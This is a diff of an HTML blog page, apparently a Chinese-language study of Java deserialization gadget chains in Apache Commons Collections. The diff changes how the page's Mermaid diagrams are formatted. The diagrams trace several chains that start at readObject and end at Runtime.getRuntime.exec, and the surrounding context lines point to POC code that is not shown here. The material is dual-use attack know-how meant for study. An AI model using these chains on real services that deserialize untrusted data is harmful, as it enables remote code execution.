@@ -493,13 +493,17 @@ public Object transform(Object input) &#123;
 <pre><code class="java">handler = (InvocationHandler) construct.newInstance(Repeatable.class, proxyMap);
 </code></pre>
 <p>链子如下：</p>
-<pre><code class="mermaid">graph TB
-sun.reflect.annotation.AnnotationInvocationHandler#\nreadObject--&gt;sun.reflect.annotation.AnnotationInvocationHandler#\ninvoke
-sun.reflect.annotation.AnnotationInvocationHandler#\ninvoke--&gt;org.apache.commons.collections.map.LazyMap#\nget
-org.apache.commons.collections.map.LazyMap#\nget--&gt;org.apache.commons.collections.functors.ChainedTransformer#\ntransform
-org.apache.commons.collections.functors.ChainedTransformer#\ntransform--&gt;org.apache.commons.collections.functors.InvokerTransformer#\ntransform\n和\norg.apache.commons.collections.functors.ConstantTransformer#\ntransform
-org.apache.commons.collections.functors.InvokerTransformer#\ntransform\n和\norg.apache.commons.collections.functors.ConstantTransformer#\ntransform--&gt;Runtime.getRuntime.exec
-</code></pre>
+<pre class="mermaid">graph TB
+sun.reflect.annotation.AnnotationInvocationHandler#\nreadObject-->sun.reflect.annotation.AnnotationInvocationHandler#\ninvoke
+sun.reflect.annotation.AnnotationInvocationHandler#\ninvoke-->org.apache.commons.collections.map.LazyMap#\nget
+org.apache.commons.collections.map.LazyMap#\nget-->org.apache.commons.collections.functors.ChainedTransformer#\ntransform
+org.apache.commons.collections.functors.ChainedTransformer#\ntransform-->org.apache.commons.collections.functors.InvokerTransformer#\ntransform\n和\norg.apache.commons.collections.functors.ConstantTransformer#\ntransform
+org.apache.commons.collections.functors.InvokerTransformer#\ntransform\n和\norg.apache.commons.collections.functors.ConstantTransformer#\ntransform-->Runtime.getRuntime.exec</pre>
+
+
+
+
+
 <p>最后的POC</p>
 <pre><code class="java">package TTT;
 import java.io.*;
@@ -663,17 +667,17 @@ for (int i = 0; i &lt; mappings; i++) &#123;
 </code></pre>
 <p>key的来源是map对象</p>
 <p>链子如下:</p>
-<pre><code class="mermaid">graph TB
-java.util.HashMap#\nreadObject--&gt;java.util.HashMap#\nhash
-java.util.HashMap#\nhash--&gt;org.apache.commons.collections.keyvalue.TiedMapEntry#\nhashCode
-org.apache.commons.collections.keyvalue.TiedMapEntry#\nhashCode--&gt;org.apache.commons.collections.keyvalue.TiedMapEntry#\ngetValue
-org.apache.commons.collections.keyvalue.TiedMapEntry#\ngetValue--&gt;org.apache.commons.collections.map.LazyMap#\nget
-org.apache.commons.collections.map.LazyMap#\nget--&gt;org.apache.commons.collections.functors.ChainedTransformer#\ntransform
-org.apache.commons.collections.functors.ChainedTransformer#\ntransform--&gt;org.apache.commons.collections.functors.InvokerTransformer#\ntransform\n和\norg.apache.commons.collections.functors.ConstantTransformer#\ntransform
-org.apache.commons.collections.functors.InvokerTransformer#\ntransform\n和\norg.apache.commons.collections.functors.ConstantTransformer#\ntransform--&gt;Runtime.getRuntime.exec
+<pre class="mermaid">graph TB
+java.util.HashMap#\nreadObject-->java.util.HashMap#\nhash
+java.util.HashMap#\nhash-->org.apache.commons.collections.keyvalue.TiedMapEntry#\nhashCode
+org.apache.commons.collections.keyvalue.TiedMapEntry#\nhashCode-->org.apache.commons.collections.keyvalue.TiedMapEntry#\ngetValue
+org.apache.commons.collections.keyvalue.TiedMapEntry#\ngetValue-->org.apache.commons.collections.map.LazyMap#\nget
+org.apache.commons.collections.map.LazyMap#\nget-->org.apache.commons.collections.functors.ChainedTransformer#\ntransform
+org.apache.commons.collections.functors.ChainedTransformer#\ntransform-->org.apache.commons.collections.functors.InvokerTransformer#\ntransform\n和\norg.apache.commons.collections.functors.ConstantTransformer#\ntransform
+org.apache.commons.collections.functors.InvokerTransformer#\ntransform\n和\norg.apache.commons.collections.functors.ConstantTransformer#\ntransform-->Runtime.getRuntime.exec</pre>
 
 
-</code></pre>
+
 <p>最后的POC</p>
 <pre><code class="java">package TTT;
 import java.io.*;
@@ -1072,15 +1076,17 @@ queue.add(2);
 </code></pre>
 <p>找到这里就可以结束这条链子了</p>
 <p>利用链如下：</p>
-<pre><code class="mermaid">graph TB
-A(&quot;java.util.PriorityQueue#\nreadObject()&quot;) --&gt; B(&quot;java.util.PriorityQueue#\nheapify()&quot;)
-B(&quot;java.util.PriorityQueue#\nheapify()&quot;)--&gt; C(&quot;java.util.PriorityQueue#\nsiftDown()&quot;)
-C(&quot;java.util.PriorityQueue#\nsiftDown()&quot;)--&gt;D(&quot;java.util.PriorityQueue#\nsiftDownUsingComparator()&quot;)
-D(&quot;java.util.PriorityQueue#\nsiftDownUsingComparator()&quot;)--&gt;E(&quot;org.apache.commons.collections4.comparators.TransformingComparator#\ncompare()&quot;)
-E(&quot;org.apache.commons.collections4.comparators.TransformingComparator#\ncompare()&quot;)--&gt;F(&quot;org.apache.commons.collections4.functors.ChainedTransformer#\ntransform()&quot;)
-F(&quot;org.apache.commons.collections4.functors.ChainedTransformer#\ntransform()&quot;)--&gt;G(&quot;org.apache.commons.collections4.functors.InvokerTransformer#\ntransform()\n和\norg.apache.commons.collections4.functors.ConstantTransformer#\ntransform()&quot;)
-G(&quot;org.apache.commons.collections4.functors.InvokerTransformer#\ntransform()\n和\norg.apache.commons.collections4.functors.ConstantTransformer#\ntransform()&quot;)--&gt;H(&quot;Runtime.getRuntime.exec(&#39;calc&#39;)&quot;)
-</code></pre>
+<pre class="mermaid">graph TB
+A("java.util.PriorityQueue#\nreadObject()") --> B("java.util.PriorityQueue#\nheapify()")
+B("java.util.PriorityQueue#\nheapify()")--> C("java.util.PriorityQueue#\nsiftDown()")
+C("java.util.PriorityQueue#\nsiftDown()")-->D("java.util.PriorityQueue#\nsiftDownUsingComparator()")
+D("java.util.PriorityQueue#\nsiftDownUsingComparator()")-->E("org.apache.commons.collections4.comparators.TransformingComparator#\ncompare()")
+E("org.apache.commons.collections4.comparators.TransformingComparator#\ncompare()")-->F("org.apache.commons.collections4.functors.ChainedTransformer#\ntransform()")
+F("org.apache.commons.collections4.functors.ChainedTransformer#\ntransform()")-->G("org.apache.commons.collections4.functors.InvokerTransformer#\ntransform()\n和\norg.apache.commons.collections4.functors.ConstantTransformer#\ntransform()")
+G("org.apache.commons.collections4.functors.InvokerTransformer#\ntransform()\n和\norg.apache.commons.collections4.functors.ConstantTransformer#\ntransform()")-->H("Runtime.getRuntime.exec('calc')")</pre>
+
+
+
 <p>最终POC如下：</p>
 <pre><code class="java">package org.example;
 import org.apache.commons.collections4.*;
@@ -1388,18 +1394,22 @@ transformingComparator.compare(tmpl,tmpl);
     &#125;
 </code></pre>
 <p>整个调用链：</p>
-<pre><code class="mermaid">graph TB
-A(&quot;java.util.PriorityQueue#\nreadObject()&quot;) --&gt; B(&quot;java.util.PriorityQueue#\nheapify()&quot;)
-B(&quot;java.util.PriorityQueue#\nheapify()&quot;)--&gt; C(&quot;java.util.PriorityQueue#\nsiftDown()&quot;)
-C(&quot;java.util.PriorityQueue#\nsiftDown()&quot;)--&gt;D(&quot;java.util.PriorityQueue#\nsiftDownUsingComparator()&quot;)
-D(&quot;java.util.PriorityQueue#\nsiftDownUsingComparator()&quot;)--&gt;E(&quot;org.apache.commons.collections4.comparators.TransformingComparator#\ncompare()&quot;)
-E(&quot;org.apache.commons.collections4.comparators.TransformingComparator#\ncompare()&quot;)--&gt;F(&quot;org.apache.commons.collections4.functors.InvokerTransformer#\ntransform()&quot;)
-F(&quot;org.apache.commons.collections4.functors.InvokerTransformer#\ntransform()&quot;)--&gt;G(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nnewTransformer()&quot;)
-G(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nnewTransformer()&quot;)--&gt;H(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ngetTransletInstance()&quot;)
-H(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ngetTransletInstance()&quot;)--&gt;I(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ndefineTransletClasses()&quot;)
-I(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ndefineTransletClasses()&quot;)--&gt;J(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nTransletClassLoader.defineClass()&quot;)
-J(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nTransletClassLoader.defineClass()&quot;)--&gt;K(&quot;Runtime.getRuntime.exec&quot;)
-</code></pre>
+<pre class="mermaid">graph TB
+A("java.util.PriorityQueue#\nreadObject()") --> B("java.util.PriorityQueue#\nheapify()")
+B("java.util.PriorityQueue#\nheapify()")--> C("java.util.PriorityQueue#\nsiftDown()")
+C("java.util.PriorityQueue#\nsiftDown()")-->D("java.util.PriorityQueue#\nsiftDownUsingComparator()")
+D("java.util.PriorityQueue#\nsiftDownUsingComparator()")-->E("org.apache.commons.collections4.comparators.TransformingComparator#\ncompare()")
+E("org.apache.commons.collections4.comparators.TransformingComparator#\ncompare()")-->F("org.apache.commons.collections4.functors.InvokerTransformer#\ntransform()")
+F("org.apache.commons.collections4.functors.InvokerTransformer#\ntransform()")-->G("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nnewTransformer()")
+G("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nnewTransformer()")-->H("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ngetTransletInstance()")
+H("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ngetTransletInstance()")-->I("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ndefineTransletClasses()")
+I("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ndefineTransletClasses()")-->J("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nTransletClassLoader.defineClass()")
+J("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nTransletClassLoader.defineClass()")-->K("Runtime.getRuntime.exec")</pre>
+
+
+
+
+
 <p>最终POC:</p>
 <pre><code class="java">package org.example;
 import java.io.*;
@@ -1704,18 +1714,22 @@ proxyMap.size();
 unserialize(&quot;ser.bin&quot;);
 </code></pre>
 <p>利用链如下：</p>
-<pre><code class="mermaid">graph TB
-A(&quot;sun.reflect.annotation.AnnotationInvocationHandler#\nreadObject()&quot;)--&gt;B(&quot;sun.reflect.annotation.AnnotationInvocationHandler#\ninvoke()&quot;)
-B(&quot;sun.reflect.annotation.AnnotationInvocationHandler#\ninvoke()&quot;)--&gt;C(&quot;org.apache.commons.collections.map.LazyMap#\nget()&quot;)
-C(&quot;org.apache.commons.collections.map.LazyMap#\nget()&quot;)--&gt;D(&quot;org.apache.commons.collections.functors.ChainedTransformer#\ntransform()&quot;)
-D(&quot;org.apache.commons.collections.functors.ChainedTransformer#\ntransform()&quot;)--&gt;E(&quot;org.apache.commons.collections.functors.InstantiateTransformer#\ntransform()\n和\norg.apache.commons.collections.functors.ConstantTransformer#\ntransform()&quot;)
-E(&quot;org.apache.commons.collections.functors.InstantiateTransformer#\ntransform()\n和\norg.apache.commons.collections.functors.ConstantTransformer#\ntransform()&quot;)--&gt;F(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter#\nTrAXFilter()&quot;)
-F(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter#\nTrAXFilter()&quot;)--&gt;G(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nnewTransformer()&quot;)
-G(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nnewTransformer()&quot;)--&gt;H(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ngetTransletInstance()&quot;)
-H(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ngetTransletInstance()&quot;)--&gt;I(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ndefineTransletClasses()&quot;)
-I(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ndefineTransletClasses()&quot;)--&gt;J(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nTransletClassLoader.defineClass()&quot;)
-J(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nTransletClassLoader.defineClass()&quot;)--&gt;K(&quot;Runtime.getRuntime.exec&quot;)
-</code></pre>
+<pre class="mermaid">graph TB
+A("sun.reflect.annotation.AnnotationInvocationHandler#\nreadObject()")-->B("sun.reflect.annotation.AnnotationInvocationHandler#\ninvoke()")
+B("sun.reflect.annotation.AnnotationInvocationHandler#\ninvoke()")-->C("org.apache.commons.collections.map.LazyMap#\nget()")
+C("org.apache.commons.collections.map.LazyMap#\nget()")-->D("org.apache.commons.collections.functors.ChainedTransformer#\ntransform()")
+D("org.apache.commons.collections.functors.ChainedTransformer#\ntransform()")-->E("org.apache.commons.collections.functors.InstantiateTransformer#\ntransform()\n和\norg.apache.commons.collections.functors.ConstantTransformer#\ntransform()")
+E("org.apache.commons.collections.functors.InstantiateTransformer#\ntransform()\n和\norg.apache.commons.collections.functors.ConstantTransformer#\ntransform()")-->F("com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter#\nTrAXFilter()")
+F("com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter#\nTrAXFilter()")-->G("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nnewTransformer()")
+G("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nnewTransformer()")-->H("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ngetTransletInstance()")
+H("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ngetTransletInstance()")-->I("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ndefineTransletClasses()")
+I("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ndefineTransletClasses()")-->J("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nTransletClassLoader.defineClass()")
+J("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nTransletClassLoader.defineClass()")-->K("Runtime.getRuntime.exec")</pre>
+
+
+
+
+
 <p>最后的POC:</p>
 <pre><code class="java">package org.example;
 import java.io.*;
@@ -1863,21 +1877,29 @@ tiedmapentry.hashCode();
     &#125;
 </code></pre>
 <p>整个调用链如下：</p>
-<pre><code class="mermaid">graph TB
-A(&quot;java.util.HashMap#\nreadObject()&quot;)--&gt;B(&quot;java.util.HashMap#\nhash()&quot;)
-B(&quot;java.util.HashMap#\nhash()&quot;)--&gt;C(&quot;org.apache.commons.collections.keyvalue.TiedMapEntry#\nhashCode()&quot;)
-C(&quot;org.apache.commons.collections.keyvalue.TiedMapEntry#\nhashCode()&quot;)--&gt;D(&quot;org.apache.commons.collections.keyvalue.TiedMapEntry#\ngetValue()&quot;)
-D(&quot;org.apache.commons.collections.keyvalue.TiedMapEntry#\ngetValue()&quot;)--&gt;E(&quot;org.apache.commons.collections.map.LazyMap#\nget()&quot;)
-E(&quot;org.apache.commons.collections.map.LazyMap#\nget()&quot;)--&gt;F(&quot;org.apache.commons.collections.functors.ChainedTransformer#\ntransform()&quot;)
+<pre class="mermaid">graph TB
+A("java.util.HashMap#\nreadObject()")-->B("java.util.HashMap#\nhash()")
+B("java.util.HashMap#\nhash()")-->C("org.apache.commons.collections.keyvalue.TiedMapEntry#\nhashCode()")
+C("org.apache.commons.collections.keyvalue.TiedMapEntry#\nhashCode()")-->D("org.apache.commons.collections.keyvalue.TiedMapEntry#\ngetValue()")
+D("org.apache.commons.collections.keyvalue.TiedMapEntry#\ngetValue()")-->E("org.apache.commons.collections.map.LazyMap#\nget()")
+E("org.apache.commons.collections.map.LazyMap#\nget()")-->F("org.apache.commons.collections.functors.ChainedTransformer#\ntransform()")
 
-F(&quot;org.apache.commons.collections.functors.ChainedTransformer#\ntransform()&quot;)--&gt;G(&quot;org.apache.commons.collections.functors.InstantiateTransformer#\ntransform()\n和\norg.apache.commons.collections.functors.ConstantTransformer#\ntransform()&quot;)
-G(&quot;org.apache.commons.collections.functors.InstantiateTransformer#\ntransform()\n和\norg.apache.commons.collections.functors.ConstantTransformer#\ntransform()&quot;)--&gt;H(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter#\nTrAXFilter()&quot;)
-H(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter#\nTrAXFilter()&quot;)--&gt;I(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nnewTransformer()&quot;)
-I(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nnewTransformer()&quot;)--&gt;J(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ngetTransletInstance()&quot;)
-J(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ngetTransletInstance()&quot;)--&gt;K(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ndefineTransletClasses()&quot;)
-K(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ndefineTransletClasses()&quot;)--&gt;L(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nTransletClassLoader.defineClass()&quot;)
-L(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nTransletClassLoader.defineClass()&quot;)--&gt;M(&quot;Runtime.getRuntime.exec&quot;)
-</code></pre>
+F("org.apache.commons.collections.functors.ChainedTransformer#\ntransform()")-->G("org.apache.commons.collections.functors.InstantiateTransformer#\ntransform()\n和\norg.apache.commons.collections.functors.ConstantTransformer#\ntransform()")
+G("org.apache.commons.collections.functors.InstantiateTransformer#\ntransform()\n和\norg.apache.commons.collections.functors.ConstantTransformer#\ntransform()")-->H("com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter#\nTrAXFilter()")
+H("com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter#\nTrAXFilter()")-->I("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nnewTransformer()")
+I("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nnewTransformer()")-->J("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ngetTransletInstance()")
+J("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ngetTransletInstance()")-->K("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ndefineTransletClasses()")
+K("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ndefineTransletClasses()")-->L("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nTransletClassLoader.defineClass()")
+L("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nTransletClassLoader.defineClass()")-->M("Runtime.getRuntime.exec")</pre>
+
+
+
+
+
+
+
+
+
 <p>最后的POC</p>
 <pre><code class="java">package org.example;
 import java.io.*;
@@ -2039,22 +2061,26 @@ public class App
         unserialize(&quot;ser.bin&quot;);
 </code></pre>
 <p>调用链如下：</p>
-<pre><code class="mermaid">graph TB
-A(&quot;java.util.PriorityQueue#\nreadObject()&quot;) --&gt; B(&quot;java.util.PriorityQueue#\nheapify()&quot;)
-B(&quot;java.util.PriorityQueue#\nheapify()&quot;)--&gt; C(&quot;java.util.PriorityQueue#\nsiftDown()&quot;)
-C(&quot;java.util.PriorityQueue#\nsiftDown()&quot;)--&gt;D(&quot;java.util.PriorityQueue#\nsiftDownUsingComparator()&quot;)
-D(&quot;java.util.PriorityQueue#\nsiftDownUsingComparator()&quot;)--&gt;E(&quot;org.apache.commons.collections4.comparators.TransformingComparator#\ncompare()&quot;)
-E(&quot;org.apache.commons.collections4.comparators.TransformingComparator#\ncompare()&quot;)--&gt;F(&quot;org.apache.commons.collections4.functors.ChainedTransformer#\ntransform()&quot;)
+<pre class="mermaid">graph TB
+A("java.util.PriorityQueue#\nreadObject()") --> B("java.util.PriorityQueue#\nheapify()")
+B("java.util.PriorityQueue#\nheapify()")--> C("java.util.PriorityQueue#\nsiftDown()")
+C("java.util.PriorityQueue#\nsiftDown()")-->D("java.util.PriorityQueue#\nsiftDownUsingComparator()")
+D("java.util.PriorityQueue#\nsiftDownUsingComparator()")-->E("org.apache.commons.collections4.comparators.TransformingComparator#\ncompare()")
+E("org.apache.commons.collections4.comparators.TransformingComparator#\ncompare()")-->F("org.apache.commons.collections4.functors.ChainedTransformer#\ntransform()")
 
 
-F(&quot;org.apache.commons.collections4.functors.ChainedTransformer#\ntransform()&quot;)--&gt;G(&quot;org.apache.commons.collections4.functors.InstantiateTransformer#\ntransform()\n和\norg.apache.commons.collections4.functors.ConstantTransformer#\ntransform()&quot;)
-G(&quot;org.apache.commons.collections4.functors.InstantiateTransformer#\ntransform()\n和\norg.apache.commons.collections4.functors.ConstantTransformer#\ntransform()&quot;)--&gt;H(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter#\nTrAXFilter()&quot;)
-H(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter#\nTrAXFilter()&quot;)--&gt;I(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nnewTransformer()&quot;)
-I(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nnewTransformer()&quot;)--&gt;J(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ngetTransletInstance()&quot;)
-J(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ngetTransletInstance()&quot;)--&gt;K(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ndefineTransletClasses()&quot;)
-K(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ndefineTransletClasses()&quot;)--&gt;L(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nTransletClassLoader.defineClass()&quot;)
-L(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nTransletClassLoader.defineClass()&quot;)--&gt;M(&quot;Runtime.getRuntime.exec&quot;)
-</code></pre>
+F("org.apache.commons.collections4.functors.ChainedTransformer#\ntransform()")-->G("org.apache.commons.collections4.functors.InstantiateTransformer#\ntransform()\n和\norg.apache.commons.collections4.functors.ConstantTransformer#\ntransform()")
+G("org.apache.commons.collections4.functors.InstantiateTransformer#\ntransform()\n和\norg.apache.commons.collections4.functors.ConstantTransformer#\ntransform()")-->H("com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter#\nTrAXFilter()")
+H("com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter#\nTrAXFilter()")-->I("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nnewTransformer()")
+I("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nnewTransformer()")-->J("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ngetTransletInstance()")
+J("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ngetTransletInstance()")-->K("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ndefineTransletClasses()")
+K("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ndefineTransletClasses()")-->L("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nTransletClassLoader.defineClass()")
+L("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nTransletClassLoader.defineClass()")-->M("Runtime.getRuntime.exec")</pre>
+
+
+
+
+
 <p>完整的POC:</p>
 <pre><code class="java">package org.example;
 import java.io.*;
@@ -2236,9 +2262,13 @@ serialize(badAttributeValueExpException);
 unserialize(&quot;ser.bin&quot;);
 </code></pre>
 <h3 id="POC1"><a href="#POC1" class="headerlink" title="POC1"></a>POC1</h3><p>完整的利用链如下：</p>
-<pre><code class="mermaid">graph TB
-A(&quot;javax.management.BadAttributeValueExpException#\nreadObject()&quot;)--&gt;B(&quot;org.apache.commons.collections.keyvalue.TiedMapEntry#\ntoString()&quot;)--&gt;C(&quot;org.apache.commons.collections.keyvalue.TiedMapEntry#\ngetValue()&quot;)--&gt;D(&quot;org.apache.commons.collections.map.LazyMap#\nget()&quot;)--&gt;E(&quot;org.apache.commons.collections.functors.ChainedTransformer#\ntransform()&quot;)--&gt;F(&quot;org.apache.commons.collections.functors.InvokerTransformer#\ntransform()\n和\norg.apache.commons.collections.functors.ConstantTransformer#\ntransform()&quot;)--&gt;G(&quot;Runtime.getRuntime.exec&quot;)
-</code></pre>
+<pre class="mermaid">graph TB
+A("javax.management.BadAttributeValueExpException#\nreadObject()")-->B("org.apache.commons.collections.keyvalue.TiedMapEntry#\ntoString()")-->C("org.apache.commons.collections.keyvalue.TiedMapEntry#\ngetValue()")-->D("org.apache.commons.collections.map.LazyMap#\nget()")-->E("org.apache.commons.collections.functors.ChainedTransformer#\ntransform()")-->F("org.apache.commons.collections.functors.InvokerTransformer#\ntransform()\n和\norg.apache.commons.collections.functors.ConstantTransformer#\ntransform()")-->G("Runtime.getRuntime.exec")</pre>
+
+
+
+
+
 <p>完整POC：</p>
 <pre><code class="java">package org.example;
 import java.io.*;
@@ -2311,9 +2341,11 @@ public class App
 </code></pre>
 <h3 id="POC2"><a href="#POC2" class="headerlink" title="POC2"></a>POC2</h3><p>上面poc1中已经到了<code>ChainedTransformer</code>,那就是可以不用<code>InvokerTransformer</code>这条链，可以修改一下走<code>InstantiateTransformer</code>–&gt;<code>TrAXFilter</code>–&gt;<code>TemplatesImpl</code>这条链</p>
 <p>利用链：</p>
-<pre><code class="mermaid">graph TB
-A(&quot;javax.management.BadAttributeValueExpException#\nreadObject()&quot;)--&gt;B(&quot;org.apache.commons.collections.keyvalue.TiedMapEntry#\ntoString()&quot;)--&gt;C(&quot;org.apache.commons.collections.keyvalue.TiedMapEntry#\ngetValue()&quot;)--&gt;D(&quot;org.apache.commons.collections.map.LazyMap#\nget()&quot;)--&gt;E(&quot;org.apache.commons.collections.functors.ChainedTransformer#\ntransform()&quot;)--&gt;F(&quot;org.apache.commons.collections.functors.InstantiateTransformer#\ntransform()\n和\norg.apache.commons.collections.functors.ConstantTransformer#\ntransform()&quot;)--&gt;G(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter#\nTrAXFilter()&quot;)--&gt;H(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nnewTransformer()&quot;)--&gt;I(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ngetTransletInstance()&quot;)--&gt;J(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ndefineTransletClasses()&quot;)--&gt;K(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nTransletClassLoader.defineClass()&quot;)--&gt;L(&quot;Runtime.getRuntime.exec&quot;)
-</code></pre>
+<pre class="mermaid">graph TB
+A("javax.management.BadAttributeValueExpException#\nreadObject()")-->B("org.apache.commons.collections.keyvalue.TiedMapEntry#\ntoString()")-->C("org.apache.commons.collections.keyvalue.TiedMapEntry#\ngetValue()")-->D("org.apache.commons.collections.map.LazyMap#\nget()")-->E("org.apache.commons.collections.functors.ChainedTransformer#\ntransform()")-->F("org.apache.commons.collections.functors.InstantiateTransformer#\ntransform()\n和\norg.apache.commons.collections.functors.ConstantTransformer#\ntransform()")-->G("com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter#\nTrAXFilter()")-->H("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nnewTransformer()")-->I("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ngetTransletInstance()")-->J("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ndefineTransletClasses()")-->K("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nTransletClassLoader.defineClass()")-->L("Runtime.getRuntime.exec")</pre>
+
+
+
 <p>最终POC:</p>
 <pre><code class="java">package org.example;
 import java.io.*;
@@ -2574,17 +2606,19 @@ f.setAccessible(true);
 f.set(chainedTransformer, transformers);
 </code></pre>
 <p>利用链如下：</p>
-<pre><code class="mermaid">graph TB
-A(&quot;java.util.HashSet#\nreadObject()&quot;)--&gt;
-B(&quot;java.util.HashMap#\nput()&quot;)--&gt;
-C(&quot;java.util.HashMap#\nhash()&quot;)--&gt;
-D(&quot;org.apache.commons.collections.keyvalue.TiedMapEntry#\nhashCode()&quot;)--&gt;
-E(&quot;org.apache.commons.collections.keyvalue.TiedMapEntry#\ngetValue()&quot;)--&gt;
-F(&quot;org.apache.commons.collections.map.LazyMap#\nget()&quot;)--&gt;
-G(&quot;org.apache.commons.collections.functors.ChainedTransformer#\ntransform()&quot;)--&gt;
-H(&quot;org.apache.commons.collections.functors.InvokerTransformer#\ntransform()\n和\norg.apache.commons.collections.functors.ConstantTransformer#\ntransform()&quot;)--&gt;
-I(&quot;Runtime.getRuntime.exec&quot;)
-</code></pre>
+<pre class="mermaid">graph TB
+A("java.util.HashSet#\nreadObject()")-->
+B("java.util.HashMap#\nput()")-->
+C("java.util.HashMap#\nhash()")-->
+D("org.apache.commons.collections.keyvalue.TiedMapEntry#\nhashCode()")-->
+E("org.apache.commons.collections.keyvalue.TiedMapEntry#\ngetValue()")-->
+F("org.apache.commons.collections.map.LazyMap#\nget()")-->
+G("org.apache.commons.collections.functors.ChainedTransformer#\ntransform()")-->
+H("org.apache.commons.collections.functors.InvokerTransformer#\ntransform()\n和\norg.apache.commons.collections.functors.ConstantTransformer#\ntransform()")-->
+I("Runtime.getRuntime.exec")</pre>
+
+
+
